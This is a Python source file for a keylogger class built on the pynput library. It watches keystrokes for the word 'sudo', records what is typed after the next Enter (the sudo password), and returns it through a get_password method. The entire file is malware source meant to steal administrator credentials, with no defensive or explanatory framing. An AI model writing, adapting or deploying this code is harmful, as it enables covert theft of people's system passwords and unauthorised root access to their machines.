from collections import deque
from pynput.keyboard import Key


class KeyLogger:
    potential_sudo = deque(maxlen=4)
    keys_list = []
    is_sudo = False
    is_enter = False
    sudo_password_list = []
    ENTER = Key.enter
    SPACE = Key.space
    BACKSPACE = Key.backspace

    def on_press(self, key):
        if self.is_sudo:
            self._find_password(key)
        self._find_sudo(key)

    def get_password(self):
        if self.sudo_password_list and not self.is_enter:
            return ''.join(self.sudo_password_list)
        return False

    def _find_sudo(self, key):
        self.potential_sudo.append(str(key).replace("'", '').replace('"', '')) if key != self.BACKSPACE else ''
        if 'sudo' in ''.join(self.potential_sudo):
            self.is_sudo = True

    def _find_password(self, key):
        self.keys_list.append(key)
        if self.keys_list[0] == self.SPACE:
            if key == self.ENTER and not self.is_enter:
                self.is_enter = True
                return
        else:
            self.keys_list = []
            self.is_sudo = False
        if self.is_enter:
            if key == self.ENTER:
                self.is_enter = False
                self.keys_list = []
                self.is_sudo = False
            else:
                self.sudo_password_list.append(str(key).replace("'", '').replace('"', ''))
